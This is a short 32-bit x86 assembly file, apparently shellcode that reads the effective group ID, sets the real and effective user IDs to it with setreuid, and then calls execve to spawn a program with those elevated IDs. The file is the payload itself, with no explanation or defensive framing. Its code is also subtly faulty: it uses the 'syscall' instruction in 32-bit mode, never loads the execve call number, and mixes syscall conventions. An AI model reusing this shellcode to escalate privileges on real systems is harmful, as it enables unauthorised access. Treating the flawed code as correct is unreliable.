bits 32

global _start
section .text

_start:
    mov eax, 0x32   ; getegid
    syscall

    mov ebx, eax    ; setreuid arg0
    mov ecx, eax    ; setreuid arg1
    mov eax, 0x46   ; setreuid
    syscall
    
    lea ebx, [esp]  ; execve arg0 (pointer to argv[0])
    xor ecx, ecx    ; execve arg1
    xor edx, edx    ; execve arg2
    syscall